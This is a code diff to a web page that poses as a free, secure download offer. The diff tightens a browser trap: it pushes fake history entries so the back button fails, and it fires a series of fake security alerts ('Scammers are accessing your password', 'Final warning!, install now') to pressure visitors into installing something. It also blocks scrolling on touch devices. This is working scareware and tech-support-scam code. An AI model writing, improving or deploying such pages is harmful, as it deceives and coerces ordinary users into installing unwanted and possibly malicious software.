@@ -81,7 +81,6 @@
       100% Free • Fast & Secure Connection • Only 22.3MB
     </div>
 
-    <!-- Hidden countdown warning text -->
     <div id="exitAttempts" style="display: none;"></div>
   </div>
 
@@ -90,7 +89,10 @@
     const maxAttempts = 4;
     const exitAttemptsText = document.getElementById('exitAttempts');
 
+    // Push two fake history entries for stronger trap
     history.pushState(null, null, location.href);
+    history.pushState(null, null, location.href);
+
     window.onpopstate = function(event) {
       history.go(1);
       handleExitAttempt();
@@ -100,14 +102,14 @@
       attempts++;
       exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
 
-      if (attempts < maxAttempts) {
-        const warnings = [
-          "Scammers are accessing your password, take action now",
-          "Last chance to protect yourself, install now!",
-          "Your device is still at risk",
-          "Final warning!, install now"
-        ];
+      const warnings = [
+        "Scammers are accessing your password, take action now",
+        "Last chance to protect yourself!",
+        "Your device is still at risk",
+        "Final warning!, install now"
+      ];
 
+      if (attempts <= maxAttempts) {
         alert(`⚠️ ${warnings[attempts - 1]}`);
 
         const alertBox = document.querySelector('.alert-box');
@@ -129,10 +131,12 @@
         `;
         document.head.appendChild(style);
       } else {
+        // Redirect only after all 4 alerts have been shown AND user presses back again
         window.location.href = "about:blank";
       }
     }
 
+    // Prevent scroll bounce
     document.addEventListener('touchmove', function(e) {
       e.preventDefault();
     }, { passive: false });
